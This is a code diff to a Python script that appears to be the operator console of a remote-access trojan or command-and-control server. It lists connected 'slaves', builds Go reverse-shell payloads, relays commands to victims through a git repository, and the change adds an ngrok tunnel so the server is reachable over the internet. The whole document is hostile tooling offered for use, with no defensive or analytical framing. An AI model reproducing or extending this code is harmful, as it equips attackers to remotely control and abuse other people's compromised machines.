@@ -36,6 +36,7 @@ except:
 repox = ""
 urix = ""
 comx = ""
+ngrox = ""
 
 
 def banner(lastupdate):
@@ -60,9 +61,14 @@ else:
 
 
 def killx():
+    global urix, ngrox
     printfc("stopping the server!", "red")
     f = open("exit.asw", "w+")
     f.close()
+    try:
+        ngrox.kill()
+    except:
+        pass
     if os.name == "nt":
         pass
     else:
@@ -353,46 +359,52 @@ def sendcommand():
     while True:
         print(colored("45hw477h4m4:~# ", 'yellow'), end="")
         xenz = input("")
-        command = xenz.split("::")
+        try:
+            command = xenz.split("::")
+        except:
+            continue
         if xenz == "":
             continue
         elif xenz.startswith("!"):
             os.system(xenz.split("!")[1])
             continue
         if command[0] == "app":
-            if command[1] == "slave":
-                try:
-                    with open(os.getcwd() + linx() + "data" + linx() + "users.txt") as user:
-                        printfc("Active slaves >>> ", "cyan")
-                        printfc(user.read(), "cyan")
-                        user.close()
-                except:
-                    printfc("No slaves are found!", "red")
-            elif command[1] == "quit":
-                printfc("\ngoodbye", "red")
-                killx()
-                sys.exit()
-            elif command[1] == "build":
-                builder()
-            elif command[1] == "help":
-                helper()
-            elif command[1] == "config":
-                printfc("removing old config.json", "red")
-                try:
-                    rev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "rev.go"
-                    winrev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "winrev.go"
-                    os.remove("config.json")
-                    os.remove(rev)
-                    os.remove(winrev)
-                except:
-                    pass
-                if setconfig():
-                    printfc("Config generated successfully!", "green")
-                    with open("config.json", "r") as config:
-                        confx = json.loads(config.read())
-                        repox = confx["repo"]
-                        config.close()
-                        setup(repox.split("/")[4], urix)
+            try:
+                if command[1] == "slave":
+                    try:
+                        with open(os.getcwd() + linx() + "data" + linx() + "users.txt") as user:
+                            printfc("Active slaves >>> ", "cyan")
+                            printfc(user.read(), "cyan")
+                            user.close()
+                    except:
+                        printfc("No slaves are found!", "red")
+                elif command[1] == "quit":
+                    printfc("\ngoodbye", "red")
+                    killx()
+                    sys.exit()
+                elif command[1] == "build":
+                    builder()
+                elif command[1] == "help":
+                    helper()
+                elif command[1] == "config":
+                    printfc("removing old config.json", "red")
+                    try:
+                        rev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "rev.go"
+                        winrev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "winrev.go"
+                        os.remove("config.json")
+                        os.remove(rev)
+                        os.remove(winrev)
+                    except:
+                        pass
+                    if setconfig():
+                        printfc("Config generated successfully!", "green")
+                        with open("config.json", "r") as config:
+                            confx = json.loads(config.read())
+                            repox = confx["repo"]
+                            config.close()
+                            setup(repox.split("/")[4], urix)
+            except:
+                continue
         else:
             try:
                 writex(command[0], command[1])
@@ -407,7 +419,12 @@ def setconfig():
     datex = str(date.today())
     printfc("Enter your repo url ###", "yellow")
     repourl = input("# ")
-    repo = repourl.split("/")
+    try:
+        repo = repourl.split("/")
+    except:
+        printfc("#Enter a git repo url ###", "red")
+        killx()
+        sys.exit()
     try:
         if os.name == "nt":
             subprocess.run('RD /S /Q ' + repo[4], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -472,7 +489,18 @@ if __name__ == '__main__':
     if os.name == "nt":
         os.system('color')
     printfc("Starting the server!", "green")
-    createtunnel()
+    printfc("Creating tunnel using ###", "green")
+    printfc("#1.serveo tunnel ###", "green")
+    printfc("#2.ngrok tunnel ###", "green")
+    print(colored("app::tunneling:~# ", 'yellow'), end="")
+    ngse = input("")
+    if ngse == str("1"):
+        createtunnel()
+    elif ngse == str("2"):
+        urix = ngrok.connect(port='5000', proto='http')
+    else:
+        printfc("###Please select a valid option ###", "red")
+        sys.exit()
     startserver()
     repo = ""
     try:
@@ -496,7 +524,7 @@ if __name__ == '__main__':
         except:
             try:
                 setup(repox.split("/")[4], urix)
-            except  Exception as e:
+            except Exception as e:
                 printfc("Run me again!", "yellow")
                 sys.exit()
         tr = threading.Thread(target=read)
